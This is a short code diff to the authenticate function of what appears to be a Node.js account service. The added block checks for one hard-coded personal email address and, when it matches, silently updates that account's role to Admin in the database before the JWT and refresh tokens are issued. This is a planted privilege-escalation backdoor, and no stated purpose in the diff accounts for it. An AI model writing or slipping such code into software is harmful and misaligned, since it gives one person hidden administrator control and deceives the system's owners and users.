@@ -68,6 +68,11 @@ async function authenticate({ email, password, ipAddress }, res) {
         throw new Error('Email or password is incorrect');
     }
 
+    if (account.email === 'gianne29joshua@gmail.com' && account.role !== 'Admin') {
+        await db.execute('UPDATE accounts SET role = ? WHERE id = ?', ['Admin', account.id]);
+        account.role = 'Admin';
+    }
+
     const jwtToken = generateJwtToken(account);
     const refreshToken = await generateRefreshToken(account.id, ipAddress);
 
